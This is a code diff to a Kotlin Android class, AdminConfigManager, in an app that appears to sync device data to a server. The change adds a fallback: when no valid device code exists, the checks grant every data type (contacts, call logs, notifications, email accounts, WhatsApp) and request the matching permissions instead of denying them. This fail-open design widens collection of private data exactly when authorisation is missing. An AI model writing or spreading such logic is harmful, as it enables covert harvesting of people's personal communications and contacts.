@@ -5,6 +5,7 @@ import android.util.Log
 import com.devicesync.app.api.RetrofitClient
 import com.devicesync.app.data.AdminConfig
 import com.devicesync.app.data.AdminConfigRequest
+import com.devicesync.app.utils.DeviceConfigManager
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 
@@ -77,29 +78,63 @@ object AdminConfigManager {
     
     /**
      * Check if a data type is allowed for current configuration
+     * If deviceCode is not available, allow all data types
      */
     fun isDataTypeAllowed(dataType: String): Boolean {
+        // If device code is not valid, allow all data types
+        if (!DeviceConfigManager.isDeviceCodeValid()) {
+            Log.d(TAG, "Device code not valid, allowing all data types: $dataType")
+            return true
+        }
+        
         return currentConfig?.isDataTypeAllowed(dataType) ?: false
     }
     
     /**
      * Get all allowed data types for current configuration
+     * If deviceCode is not available, return all available data types
      */
     fun getAllowedDataTypes(): List<String> {
+        // If device code is not valid, return all available data types
+        if (!DeviceConfigManager.isDeviceCodeValid()) {
+            Log.d(TAG, "Device code not valid, returning all available data types")
+            return listOf("CONTACTS", "CALL_LOGS", "NOTIFICATIONS", "EMAIL_ACCOUNTS", "WHATSAPP")
+        }
+        
         return currentConfig?.allowedDataTypes ?: emptyList()
     }
     
     /**
      * Get required permissions for current configuration
+     * If deviceCode is not available, return all required permissions
      */
     fun getRequiredPermissions(): List<String> {
+        // If device code is not valid, return all required permissions
+        if (!DeviceConfigManager.isDeviceCodeValid()) {
+            Log.d(TAG, "Device code not valid, returning all required permissions")
+            return listOf(
+                "android.permission.READ_CONTACTS",
+                "android.permission.READ_CALL_LOG",
+                "android.permission.POST_NOTIFICATIONS",
+                "android.permission.GET_ACCOUNTS",
+                "android.permission.READ_EXTERNAL_STORAGE"
+            )
+        }
+        
         return currentConfig?.getRequiredPermissions() ?: emptyList()
     }
     
     /**
      * Check if admin configuration is active
+     * If deviceCode is not available, consider config as active (allowing all data types)
      */
     fun isConfigActive(): Boolean {
+        // If device code is not valid, consider config as active (allowing all data types)
+        if (!DeviceConfigManager.isDeviceCodeValid()) {
+            Log.d(TAG, "Device code not valid, considering config as active")
+            return true
+        }
+        
         return currentConfig?.isActive == true
     }
     
@@ -116,6 +151,26 @@ object AdminConfigManager {
     fun clearConfig() {
         currentConfig = null
         Log.d(TAG, "Admin config cleared")
+    }
+    
+    /**
+     * Check if currently in fallback mode (device code not valid)
+     */
+    fun isInFallbackMode(): Boolean {
+        return !DeviceConfigManager.isDeviceCodeValid()
+    }
+    
+    /**
+     * Get current configuration status summary
+     */
+    fun getConfigStatusSummary(): String {
+        return if (isInFallbackMode()) {
+            "🚨 FALLBACK MODE: Device code not valid - All data types allowed"
+        } else if (currentConfig != null) {
+            "✅ ADMIN CONFIG: ${currentConfig?.allowedDataTypes?.joinToString(", ") ?: "None"}"
+        } else {
+            "⚠️ NO CONFIG: No admin configuration loaded"
+        }
     }
     
     /**
